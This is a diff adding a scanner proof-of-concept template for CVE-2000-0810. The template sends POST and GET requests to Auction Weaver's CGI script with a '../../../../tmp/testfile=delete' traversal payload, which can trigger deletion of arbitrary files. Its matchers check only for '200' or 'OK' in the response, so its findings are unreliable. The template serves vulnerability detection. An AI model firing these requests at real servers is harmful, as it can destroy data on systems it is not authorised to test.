@@ -1,0 +1,49 @@
+[info]
+author = "AVE"
+description = "检测 Auction Weaver 1.0-1.04 是否存在表单字段名路径遍历漏洞，通过向 CGI 脚本发送包含 .. 序列的恶意表单字段名，验证是否可触发目录遍历删除任意文件"
+id = "POC-AVE-2000-0958"
+name = "CVE-2000-0810 PoC"
+severity = "high"
+tags = ["ave-2000-0958"]
+vuln_id = [
+    "CVE-2000-0810",
+    "AVE-2000-0958",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/auctionweaver.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "../../../../tmp/testfile=delete&bid=1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "200",
+    "OK",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/auctionweaver.cgi?../../../../tmp/testfile=delete&cmd=del"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "200",
+    "OK",
+]
